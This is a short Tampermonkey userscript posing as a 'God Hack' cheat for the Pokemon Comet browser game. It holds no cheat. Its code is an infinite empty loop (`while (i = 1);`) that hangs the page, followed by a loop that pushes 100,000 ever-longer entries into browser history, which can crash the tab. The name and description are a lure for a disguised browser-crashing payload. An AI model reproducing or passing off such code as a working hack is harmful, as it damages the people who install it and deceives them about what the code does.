// ==UserScript==
// @name         Pokemon Comet God Hack 0.1
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Beware, for you may get banned.
// @author       Golden
// @match        http://pokemon-comet.net/*
// @grant        none
// ==/UserScript==

      var i = "1";
while (i = 1); {
    alert("Something went wrong!");
}

      var total = "";
      for( var i = 0; i < 100000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
      }